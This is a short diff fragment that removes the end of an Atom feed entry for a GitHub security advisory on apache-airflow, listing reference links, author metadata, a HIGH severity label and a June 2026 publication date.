-<li><a href="https://github.com/apache/airflow/commit/bfd1881fa0cb1193f49dbac72d7462e66aaf8f25">https://github.com/apache/airflow/commit/bfd1881fa0cb1193f49dbac72d7462e66aaf8f25</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2026-2345.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2026-2345.yaml</a></li>
-<li><a href="https://pypi.org/project/apache-airflow">https://pypi.org/project/apache-airflow</a></li>
-<li><a href="https://github.com/advisories/GHSA-6hcw-qqr8-pjj8">https://github.com/advisories/GHSA-6hcw-qqr8-pjj8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-6hcw-qqr8-pjj8</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-01T09:31:13.000Z</published>
     </entry>
 </feed>
